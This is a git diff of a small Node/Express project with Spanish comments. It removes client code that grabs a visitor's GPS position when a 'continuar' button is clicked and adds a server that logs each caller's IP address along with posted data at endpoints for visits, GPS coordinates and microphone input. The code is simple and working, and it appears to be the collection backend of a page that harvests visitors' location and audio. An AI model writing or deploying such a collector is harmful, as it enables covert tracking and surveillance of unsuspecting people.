@@ -1,26 +1,83 @@
-document.getElementById("continuar")
-.onclick = ()=>{
+const express = require("express")
 
-navigator.geolocation.getCurrentPosition((pos)=>{
+const app = express()
 
-   fetch("/gps",{
+app.use(express.json())
 
-      method:"POST",
+app.use(express.static("public"))
 
-      headers:{
-         "Content-Type":"application/json"
-      },
 
-      body: JSON.stringify({
+// =======================
+// LOG PRINCIPAL
+// =======================
 
-         lat: pos.coords.latitude,
+app.post("/log",(req,res)=>{
 
-         lon: pos.coords.longitude
+   const ip =
+   req.headers['x-forwarded-for'] ||
+   req.socket.remoteAddress
 
-      })
+   console.log("\n========== VISITA ==========")
 
-   })
+   console.log("IP:", ip)
+
+   console.log(req.body)
+
+   res.sendStatus(200)
 
 })
 
-}
+
+// =======================
+// GPS
+// =======================
+
+app.post("/gps",(req,res)=>{
+
+   const ip =
+   req.headers['x-forwarded-for'] ||
+   req.socket.remoteAddress
+
+   console.log("\n========== GPS ==========")
+
+   console.log("IP:", ip)
+
+   console.log(req.body)
+
+   res.sendStatus(200)
+
+})
+
+
+// =======================
+// MICROFONO
+// =======================
+
+app.post("/microfono",(req,res)=>{
+
+   const ip =
+   req.headers['x-forwarded-for'] ||
+   req.socket.remoteAddress
+
+   console.log("\n========== MICROFONO ==========")
+
+   console.log("IP:", ip)
+
+   console.log(req.body)
+
+   res.sendStatus(200)
+
+})
+
+
+// =======================
+// START
+// =======================
+
+const PORT = process.env.PORT || 3000
+
+app.listen(PORT,()=>{
+
+   console.log("Servidor iniciado")
+
+})
